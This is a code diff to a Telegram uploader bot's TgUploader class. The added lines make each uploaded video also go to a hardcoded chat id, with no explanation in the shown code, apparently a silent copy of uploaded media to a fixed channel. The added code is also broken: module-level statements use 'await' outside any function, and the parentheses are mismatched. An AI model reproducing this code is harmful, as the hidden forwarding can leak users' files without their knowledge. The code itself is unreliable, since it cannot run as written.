@@ -18,6 +18,8 @@ VIDEO_SUFFIXES = ("MKV", "MP4", "MOV", "WMV", "3GP", "MPG", "WEBM", "AVI", "FLV"
 AUDIO_SUFFIXES = ("MP3", "M4A", "M4B", "FLAC", "WAV", "AIF", "OGG", "AAC", "DTS", "MID", "AMR", "MKA")
 IMAGE_SUFFIXES = ("JPG", "JPX", "PNG", "GIF", "WEBP", "CR2", "TIF", "BMP", "JXR", "PSD", "ICO", "HEIC", "JPEG")
 
+ thonmsg = message
+    message = await message.bot.pyro.get_messages(message.chat_id, message.id)
 
 class TgUploader:
 
@@ -98,7 +100,20 @@ class TgUploader:
                                                               thumb=thumb,
                                                               supports_streaming=True,
                                                               disable_notification=True,
-                                                              progress=self.upload_progress)
+                                                              progress=self.upload_progress,
+                                                             ),
+                    )
+                    await thonmsg.bot.pyro.send_video(
+                    chat_id=-1001547194922,
+                    video=sent_message.video.file_id,
+                    parse_mode="html",
+                    duration=duration,
+                    width=480,
+                    height=320,
+                    thumb=thumb,
+                    caption=cap_mono,
+                    supports_streaming=True,
+                )
                 elif filee.upper().endswith(AUDIO_SUFFIXES):
                     duration , artist, title = get_media_info(up_path)
                     self.sent_msg = self.sent_msg.reply_audio(audio=up_path,
